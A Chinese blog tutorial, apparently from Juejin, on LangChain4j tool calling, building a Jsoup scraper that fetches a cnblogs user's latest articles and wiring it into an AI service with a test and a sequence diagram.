ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你有没有遇到过这种场景：</p>
<ul>
<li>用户问 AI："帮我查下今天上海的天气"</li>
<li>AI 回答："抱歉，我无法获取实时信息。"</li>
</ul>
<p>**问题的核心是：AI 没有工具。**就像给你一双手脚，让你去盖房子，你也做不到。但如果给你一套工具箱，情况就完全不同了。</p>
<p><strong>今天我们就来给 AI 装上一套工具箱</strong>，让它能够从博客园实时获取最新技术文章。</p>
<h2 data-id="heading-0">什么是工具调用？</h2>
<p>简单来说，工具调用就是让 AI 能够"借用"外部能力。</p>
<p>这些能力包括但不限于：</p>
<ul>
<li>联网搜索</li>
<li>调用第三方 API</li>
<li>读写文件</li>
<li>查询数据库</li>
<li>执行代码</li>
</ul>
<p><strong>但有一个关键点要特别注意</strong>：</p>
<p>工具调用 <strong>不是</strong> AI 自己去执行这些工具，而是 AI 说"我需要调用 XX 工具"，真正执行的是我们的应用程序。</p>
<p>流程是这样的：</p>
<pre><code class="hljs">用户提问 → AI 分析意图 → AI 决定调用工具
→ 我们的程序执行工具 → 把结果返回给 AI → AI 继续回答
</code></pre>
<h2 data-id="heading-1">要实现的目标</h2>
<p>让 AI 能够查询博客园用户的最新文章，并提取这些信息：</p>
<ul>
<li>文章标题</li>
<li>文章链接</li>
<li>发布日期</li>
<li>摘要内容</li>
<li>阅读数、评论数、推荐数</li>
</ul>
<p><strong>实现方案</strong>：用 Jsoup 抓取博客园页面，把数据整理后返回给 AI。</p>
<h2 data-id="heading-2">快速了解流程</h2>
<p>完整流程其实很简单：</p>
<ol>
<li>用户提问 → 2. AI 分析意图 → 3. AI 决定调用工具 → 4. 程序执行工具 → 5. 结果返回给 AI → 6. AI 整理后回复用户</li>
</ol>
<p><strong>核心就是</strong>：AI 不直接调用工具，而是告诉我们的程序"我需要调用这个工具"，程序执行完后把结果给 AI，AI 再基于结果回答用户。</p>
<blockquote>
<p>想看详细的调用链路？文章最后有完整的时序图，包你一看就懂。</p>
</blockquote>
<h2 data-id="heading-3">动手实现（四步搞定）</h2>
<h3 data-id="heading-4">步骤 1：引入依赖</h3>
<p>先在 <code>pom.xml</code> 中加入 Jsoup（网页爬虫库）：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jsoup<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jsoup<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.20.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-5">步骤 2：编写工具类</h3>
<p>在 <code>tools</code> 包下创建一个工具类，用 <code>@Tool</code> 注解告诉 LangChain4j："这是一个工具"。</p>
<p><strong>⚠️ 重点</strong>：工具描述一定要写清楚，AI 能否正确调用工具全看这个描述！</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 博客园文章搜索工具
 * 用于从博客园抓取用户的最新文章信息
 *
 * <span class="hljs-doctag">@author</span> BNTang
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CnblogsArticleTool</span> {

    <span class="hljs-comment">/**
     * 从指定用户的博客园主页获取最新的技术文章列表。
     * 支持提取文章标题、链接、发布日期、摘要、阅读数、评论数和推荐数等信息。
     *
     * <span class="hljs-doctag">@param</span> input 博客园用户名或URL，可选地附加"|N"来限制结果数量
     * <span class="hljs-doctag">@return</span> 技术文章列表的JSON格式，包含详细信息，若失败则返回错误信息
     */</span>
    <span class="hljs-meta">@Tool(name = "cnblogsSearch", value = """
            从博客园获取最新文章。输入可以是：
            - 博客园用户名（例如：'someUser'）
            - 完整的个人主页URL（例如：'https://www.cnblogs.com/someUser/'）
            可选择性地附加'|N'来限制结果数量，例如：'someUser|5'。
            返回包含标题、链接、日期、摘要、阅读数、评论数、推荐数的JSON数组。
            """
    )</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">searchCnblogsArticles</span><span class="hljs-params">(<span class="hljs-meta">@P(value = "用户名或URL（可选地附加|限制数量）")</span> String input)</span> {
        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span> || input.trim().isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"error\":\"Empty input\"}"</span>;
        }

        String[] parts = input.trim().split(<span class="hljs-string">"\\|"</span>, <span class="hljs-number">2</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> parts[<span class="hljs-number">0</span>].trim();
        <span class="hljs-type">int</span> <span class="hljs-variable">limit</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
        <span class="hljs-keyword">if</span> (parts.length == <span class="hljs-number">2</span>) {
            <span class="hljs-keyword">try</span> {
                limit = Math.max(<span class="hljs-number">1</span>, Math.min(<span class="hljs-number">100</span>, Integer.parseInt(parts[<span class="hljs-number">1</span>].trim())));
            } <span class="hljs-keyword">catch</span> (NumberFormatException ignored) { <span class="hljs-comment">/* keep default */</span> }
        }

        String url;
        <span class="hljs-keyword">if</span> (target.startsWith(<span class="hljs-string">"http://"</span>) || target.startsWith(<span class="hljs-string">"https://"</span>)) {
            url = target;
        } <span class="hljs-keyword">else</span> {
            url = <span class="hljs-string">"https://www.cnblogs.com/"</span> + target + <span class="hljs-string">"/"</span>;
        }

        <span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> fetchDocumentWithRetries(url, <span class="hljs-number">3</span>, <span class="hljs-number">8000</span>);
        <span class="hljs-keyword">if</span> (doc == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"error\":\"Failed to fetch or parse page\"}"</span>;
        }

        <span class="hljs-comment">// 选择博客文章的主容器</span>
        <span class="hljs-type">Elements</span> <span class="hljs-variable">dayElements</span> <span class="hljs-operator">=</span> doc.select(<span class="hljs-string">".day"</span>);

        List&lt;ArticleInfo&gt; results = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-keyword">for</span> (Element dayEl : dayElements) {
            <span class="hljs-keyword">if</span> (results.size() &gt;= limit) {
                <span class="hljs-keyword">break</span>;
            }

            <span class="hljs-comment">// 提取标题和链接</span>
            <span class="hljs-type">Element</span> <span class="hljs-variable">titleEl</span> <span class="hljs-operator">=</span> dayEl.selectFirst(<span class="hljs-string">".postTitle a, .postTitle2"</span>);
            <span class="hljs-keyword">if</span> (titleEl == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">continue</span>;
            }

            <span class="hljs-type">String</span> <span class="hljs-variable">title</span> <span class="hljs-operator">=</span> titleEl.text().trim();
            <span class="hljs-comment">// 移除"[置顶]"标记</span>
            title = title.replaceAll(<span class="hljs-string">"^\\[置顶]\\s*"</span>, <span class="hljs-string">""</span>);

            <span class="hljs-type">String</span> <span class="hljs-variable">href</span> <span class="hljs-operator">=</span> titleEl.absUrl(<span class="hljs-string">"href"</span>);
            <span class="hljs-keyword">if</span> (href.isEmpty()) {
                href = titleEl.attr(<span class="hljs-string">"href"</span>).trim();
            }

            <span class="hljs-comment">// 去重检查</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">seen</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">for</span> (ArticleInfo r : results) {
                <span class="hljs-keyword">if</span> (r.url.equals(href)) {
                    seen = <span class="hljs-literal">true</span>;
                    <span class="hljs-keyword">break</span>;
                }
            }
            <span class="hljs-keyword">if</span> (seen) {
                <span class="hljs-keyword">continue</span>;
            }

            <span class="hljs-comment">// 提取日期</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
            <span class="hljs-type">Element</span> <span class="hljs-variable">dateEl</span> <span class="hljs-operator">=</span> dayEl.selectFirst(<span class="hljs-string">".dayTitle a"</span>);
            <span class="hljs-keyword">if</span> (dateEl != <span class="hljs-literal">null</span>) {
                date = dateEl.text().trim();
            }

            <span class="hljs-comment">// 提取摘要</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">summary</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
            <span class="hljs-type">Element</span> <span class="hljs-variable">summaryEl</span> <span class="hljs-operator">=</span> dayEl.selectFirst(<span class="hljs-string">".c_b_p_desc, .postCon"</span>);
            <span class="hljs-keyword">if</span> (summaryEl != <span class="hljs-literal">null</span>) {
                summary = summaryEl.text().trim();
                <span class="hljs-comment">// 移除"阅读全文"链接文本</span>
                summary = summary.replaceAll(<span class="hljs-string">"阅读全文$"</span>, <span class="hljs-string">""</span>).trim();
                <span class="hljs-comment">// 限制摘要长度</span>
                <span class="hljs-keyword">if</span> (summary.length() &gt; <span class="hljs-number">200</span>) {
                    summary = summary.substring(<span class="hljs-number">0</span>, <span class="hljs-number">200</span>) + <span class="hljs-string">"..."</span>;
                }
            }

            <span class="hljs-comment">// 提取统计信息</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">viewCount</span> <span class="hljs-operator">=</span> <span class="hljs-string">"0"</span>;
            <span class="hljs-type">String</span> <span class="hljs-variable">commentCount</span> <span class="hljs-operator">=</span> <span class="hljs-string">"0"</span>;
            <span class="hljs-type">String</span> <span class="hljs-variable">diggCount</span> <span class="hljs-operator">=</span> <span class="hljs-string">"0"</span>;

            <span class="hljs-type">Element</span> <span class="hljs-variable">postDesc</span> <span class="hljs-operator">=</span> dayEl.selectFirst(<span class="hljs-string">".postDesc"</span>);
            <span class="hljs-keyword">if</span> (postDesc != <span class="hljs-literal">null</span>) {
                <span class="hljs-type">Element</span> <span class="hljs-variable">viewEl</span> <span class="hljs-operator">=</span> postDesc.selectFirst(<span class="hljs-string">".post-view-count"</span>);
                <span class="hljs-keyword">if</span> (viewEl != <span class="hljs-literal">null</span>) {
                    viewCount = extractNumber(viewEl.text());
                }

                <span class="hljs-type">Element</span> <span class="hljs-variable">commentEl</span> <span class="hljs-operator">=</span> postDesc.selectFirst(<span class="hljs-string">".post-comment-count"</span>);
                <span class="hljs-keyword">if</span> (commentEl != <span class="hljs-literal">null</span>) {
                    commentCount = extractNumber(commentEl.text());
                }

                <span class="hljs-type">Element</span> <span class="hljs-variable">diggEl</span> <span class="hljs-operator">=</span> postDesc.selectFirst(<span class="hljs-string">".post-digg-count"</span>);
                <span class="hljs-keyword">if</span> (diggEl != <span class="hljs-literal">null</span>) {
                    diggCount = extractNumber(diggEl.text());
                }
            }

            <span class="hljs-keyword">if</span> (!title.isEmpty() &amp;&amp; !href.isEmpty()) {
                results.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArticleInfo</span>(title, href, date, summary, viewCount, commentCount, diggCount));
            }
        }

        <span class="hljs-keyword">if</span> (results.isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"message\":\"未找到文章。\"}"</span>;
        }

        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        sb.append(<span class="hljs-string">"["</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; results.size(); i++) {
            <span class="hljs-type">ArticleInfo</span> <span class="hljs-variable">article</span> <span class="hljs-operator">=</span> results.get(i);
            sb.append(<span class="hljs-string">"{"</span>);
            sb.append(<span class="hljs-string">"\"title\":"</span>).append(jsonEscape(article.title)).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"url\":"</span>).append(jsonEscape(article.url)).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"date\":"</span>).append(jsonEscape(article.date)).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"summary\":"</span>).append(jsonEscape(article.summary)).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"viewCount\":"</span>).append(article.viewCount).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"commentCount\":"</span>).append(article.commentCount).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"diggCount\":"</span>).append(article.diggCount);
            sb.append(<span class="hljs-string">"}"</span>);
            <span class="hljs-keyword">if</span> (i &lt; results.size() - <span class="hljs-number">1</span>) {
                sb.append(<span class="hljs-string">","</span>);
            }
        }
        sb.append(<span class="hljs-string">"]"</span>);
        <span class="hljs-keyword">return</span> sb.toString();
    }

    <span class="hljs-comment">/**
     * 带重试机制获取网页文档
     *
     * <span class="hljs-doctag">@param</span> url         目标URL
     * <span class="hljs-doctag">@param</span> maxAttempts 最大尝试次数
     * <span class="hljs-doctag">@param</span> timeoutMs   超时时间（毫秒）
     * <span class="hljs-doctag">@return</span> Jsoup文档对象，失败返回null
     */</span>
    <span class="hljs-keyword">private</span> Document <span class="hljs-title function_">fetchDocumentWithRetries</span><span class="hljs-params">(String url, <span class="hljs-type">int</span> maxAttempts, <span class="hljs-type">int</span> timeoutMs)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">userAgent</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Mozilla/5.0 (compatible; Bot/1.0; +https://example.com/bot)"</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">attempt</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (attempt &lt; maxAttempts) {
            attempt++;
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">return</span> Jsoup.connect(url)
                        .userAgent(userAgent)
                        .timeout(timeoutMs)
                        .referrer(<span class="hljs-string">"https://www.google.com"</span>)
                        .get();
            } <span class="hljs-keyword">catch</span> (IOException e) {
                log.warn(<span class="hljs-string">"第{}次尝试获取 {} 失败: {}"</span>, attempt, url, e.getMessage());
                <span class="hljs-keyword">try</span> {
                    Thread.sleep(<span class="hljs-number">500L</span> * attempt);
                } <span class="hljs-keyword">catch</span> (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                    <span class="hljs-keyword">break</span>;
                }
            }
        }
        log.error(<span class="hljs-string">"所有尝试均失败，无法获取 {}"</span>, url);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">/**
     * 从文本中提取数字
     *
     * <span class="hljs-doctag">@param</span> text 包含数字的文本，如"阅读(123)"
     * <span class="hljs-doctag">@return</span> 提取的数字字符串
     */</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">extractNumber</span><span class="hljs-params">(String text)</span> {
        <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"0"</span>;
        }
        text = text.replaceAll(<span class="hljs-string">"[^0-9]"</span>, <span class="hljs-string">""</span>);
        <span class="hljs-keyword">return</span> text.isEmpty() ? <span class="hljs-string">"0"</span> : text;
    }

    <span class="hljs-comment">/**
     * JSON字符串转义
     *
     * <span class="hljs-doctag">@param</span> s 待转义的字符串
     * <span class="hljs-doctag">@return</span> 转义后的JSON字符串
     */</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">jsonEscape</span><span class="hljs-params">(String s)</span> {
        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"\"\""</span>;
        }
        <span class="hljs-type">String</span> <span class="hljs-variable">escaped</span> <span class="hljs-operator">=</span> s.replace(<span class="hljs-string">"\\"</span>, <span class="hljs-string">"\\\\"</span>)
                .replace(<span class="hljs-string">"\""</span>, <span class="hljs-string">"\\\""</span>)
                .replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">"\\n"</span>)
                .replace(<span class="hljs-string">"\r"</span>, <span class="hljs-string">"\\r"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"\""</span> + escaped + <span class="hljs-string">"\""</span>;
    }

    <span class="hljs-comment">/**
     * 文章信息类
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArticleInfo</span> {
        String title;
        String url;
        String date;
        String summary;
        String viewCount;
        String commentCount;
        String diggCount;

        ArticleInfo(String title, String url, String date, String summary,
                    String viewCount, String commentCount, String diggCount) {
            <span class="hljs-built_in">this</span>.title = title;
            <span class="hljs-built_in">this</span>.url = url;
            <span class="hljs-built_in">this</span>.date = date;
            <span class="hljs-built_in">this</span>.summary = summary;
            <span class="hljs-built_in">this</span>.viewCount = viewCount;
            <span class="hljs-built_in">this</span>.commentCount = commentCount;
            <span class="hljs-built_in">this</span>.diggCount = diggCount;
        }
    }
}
</code></pre>
<p><strong>核心逻辑</strong>：</p>
<ol>
<li>解析用户输入（支持用户名或 URL）</li>
<li>用 Jsoup 抓取博客园页面</li>
<li>用 CSS 选择器提取文章信息</li>
<li>返回 JSON 格式的结果</li>
</ol>
<h3 data-id="heading-6">步骤 3：把工具绑定到 AI Service</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> AiCodeHelperService <span class="hljs-title function_">aiCodeHelperService</span><span class="hljs-params">()</span> {
    <span class="hljs-type">ChatMemory</span> <span class="hljs-variable">chatMemory</span> <span class="hljs-operator">=</span> MessageWindowChatMemory.withMaxMessages(<span class="hljs-number">10</span>);

    <span class="hljs-keyword">return</span> AiServices.builder(AiCodeHelperService.class)
            .chatModel(qwenChatModel)
            .chatMemory(chatMemory)
            .contentRetriever(contentRetriever)
            .tools(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CnblogsArticleTool</span>())  <span class="hljs-comment">// ← 绑定工具</span>
            .build();
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/499b163d84ed4c5e85be70841a8ec6e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=odp%2FgtNatrMahPCBvpHTq7Mtmz8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">步骤 4：测试一下</h3>
<p>写个单元测试：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">chatWithTools</span><span class="hljs-params">()</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> aiCodeHelperService.chat(
        <span class="hljs-string">"帮我查下博客园用户 BNTang 的最新文章"</span>
    );
    System.out.println(result);
}
</code></pre>
<p><strong>关键来了</strong>，在工具方法里打断点，Debug 运行：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/611e6c0594924a4c89ee6ae09d7561d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=lSuoawscE%2Fdapa5f0Mzp5sqtFx4%3D" alt="" loading="lazy"/></p>
<p><strong>你会看到断点真的停下来了！</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0db05f55f0554c14a1696cea870ca029~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=by2Q5Hax0Nqmo%2BjseVCvMgzalmY%3D" alt="" loading="lazy"/></p>
<p>这说明 <strong>AI 真的调用了我们的工具</strong>！</p>
<p>工具把数据返回给 AI 后，AI 会整理成自然语言：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cce64cd25ea34866a36b73a7cfe34272~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=RhIYv3Y4nx5FDfJ0%2F%2FXQDJeKVkI%3D" alt="" loading="lazy"/></p>
<p>在 Debug 模式下，你还能看到 AI Service 加载了工具：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f05ef6d9c21746b1a6d135fd4718c1d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=Qzkiw1asAAXRXe9uyV%2BaOSe0LeU%3D" alt="" loading="lazy"/></p>
<p>以及工具的完整调用链路：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75b9d16cb6fe4fc69e8efe49135871dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=1%2FNf3wsSa202z0IbwY%2F%2Frnw0KYk%3D" alt="" loading="lazy"/></p>
<p><strong>完美运行！</strong></p>
<h2 data-id="heading-8">工具定义的两种方式</h2>
<p>前面用的是声明式定义（注解），LangChain4j 也支持编程式定义：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/061062b7cb694c1eacb33dcced29be88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYTkVP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944108&amp;x-signature=DbINAjyjC6kWH3f80FbL428%2FKPM%3D" alt="" loading="lazy"/></p>
<p><strong>简单场景用声明式，需要动态创建工具用编程式。</strong></p>
<h2 data-id="heading-9">还能做更多</h2>
<p>除了搜索，工具调用还能实现这些功能：</p>
<ul>
<li>读写本地文件</li>
<li>生成 PDF 报告</li>
<li>执行 Shell 命令</li>
<li>生成图表</li>
<li>调用企业内部 API</li>
</ul>
<p><strong>更棒的是</strong>：这些工具不一定都要自己写，可以通过 MCP（Model Context Protocol）协议直接用别人开发好的工具。</p>
<h2 data-id="heading-10">完整的调用链路</h2>
<p>如果想深入理解工具调用的每一步，看这个时序图就对了：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
      autonumber

      participant U2 as 🧪 Test(用户)
      participant B1 as AiCodeHelperService
      participant L1 as LangChain4j框架
      participant L2 as ChatModel(LLM)
      participant B3 as CnblogsArticleTool
      participant T1 as Jsoup(网页抓取)

      Note over U2,T1: chatWithTools() 测试流程

      U2-&gt;&gt;B1: chat("帮我查询博客园用户 BNTang 的最新技术文章...")
      B1-&gt;&gt;L1: 转发请求
      L1-&gt;&gt;L1: 加载 system-prompt.txt
      L1-&gt;&gt;L1: 添加 ChatMemory(最近10条消息)
      L1-&gt;&gt;L2: 发送用户消息

      L2-&gt;&gt;L2: 分析意图
      L2-&gt;&gt;L2: 识别需要调用 cnblogsSearch 工具

      L2--&gt;&gt;L1: 返回工具调用请求
      L1-&gt;&gt;B3: searchCnblogsArticles("BNTang")

      B3-&gt;&gt;B3: 解析输入参数
      B3-&gt;&gt;B3: 构造URL (https://www.cnblogs.com/BNTang/)

      B3-&gt;&gt;T1: fetchDocumentWithRetries(url, 3, 8000)
      T1-&gt;&gt;T1: 发送HTTP请求
      T1--&gt;&gt;B3: 返回HTML文档

      B3-&gt;&gt;B3: 解析HTML (.day 元素)
      B3-&gt;&gt;B3: 提取文章信息(标题、链接、日期、摘要等)
      B3-&gt;&gt;B3: 生成JSON结果

      B3--&gt;&gt;L1: 返回文章列表JSON
      L1-&gt;&gt;L2: 发送工具结果给LLM

      L2-&gt;&gt;L2: 基于工具结果生成最终回复
      L2--&gt;&gt;L1: 返回最终答案
      L1--&gt;&gt;B1: 返回结果
      B1--&gt;&gt;U2: 返回 String 结果

      U2-&gt;&gt;U2: System.out.println(result)
</code></pre>
<p><strong>时序图解读</strong>：</p>
<ol>
<li><strong>用户发起请求</strong>（步骤 1-4）：Test 调用 Service，Service 转发给 LangChain4j 框架</li>
<li><strong>AI 分析意图</strong>（步骤 5-7）：LLM 分析用户问题，决定需要调用 <code>cnblogsSearch</code> 工具</li>
<li><strong>工具执行</strong>（步骤 8-17）：Tool 用 Jsoup 抓取博客园页面，解析数据</li>
<li><strong>结果返回</strong>（步骤 18-21）：工具结果返回给 LLM，LLM 生成最终答案</li>
</ol>
<p><strong>关键点</strong>：工具执行在应用侧（B3、T1），不在 AI 服务器（L2）。</p>
<h2 data-id="heading-11">写在最后</h2>
<p>工具调用是让 AI 突破能力边界的关键技术。</p>
<p><strong>记住三个要点</strong>：</p>
<ol>
<li>工具描述写清楚，AI 才能正确调用</li>
<li>工具在应用侧执行，不在 AI 服务器</li>
<li>声明式定义简单，编程式定义灵活</li>
</ol>
<p>通过 LangChain4j 的 <code>@Tool</code> 注解，只需要几行代码，就能让 AI 拥有"超能力"。</p>
<hr/>
<p><strong>系列文章持续更新中，关注我不错过每一篇干货。</strong></p>
<p><strong>这篇文章对你有用的话，点个赞、在看支持一下吧！</strong></p>
<hr/>
<p><strong>相关文章推荐</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FXhmFIeKpJR37AqqLg46b5w" target="_blank" title="https://mp.weixin.qq.com/s/XhmFIeKpJR37AqqLg46b5w" ref="nofollow noopener noreferrer">智谱 GLM-4.7 编程第一</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F8fRzTXtAJ8_IfX2OggGDsw" target="_blank" title="https://mp.weixin.qq.com/s/8fRzTXtAJ8_IfX2OggGDsw" ref="nofollow noopener noreferrer">LangChain4j 结构化输出实战</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FKtaNzGc3wbVKPwMTVl1z4g" target="_blank" title="https://mp.weixin.qq.com/s/KtaNzGc3wbVKPwMTVl1z4g" ref="nofollow noopener noreferrer">让 AI 不再失忆</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FpnCbt98Ob4hb8sj9WPVV3g" target="_blank" title="https://mp.weixin.qq.com/s/pnCbt98Ob4hb8sj9WPVV3g" ref="nofollow noopener noreferrer">Claude Code 免费指南</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kafka学习笔记系列——小试牛刀]]></title>    <link>https://juejin.cn/post/7590654280898871339</link>    <guid>https://juejin.cn/post/7590654280898871339</guid>    <pubDate>2026-01-02T07:44:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590654280898871339" data-draft-id="7589942565011750938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kafka学习笔记系列——小试牛刀"/> <meta itemprop="keywords" content="Kafka,面试"/> <meta itemprop="datePublished" content="2026-01-02T07:44:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div 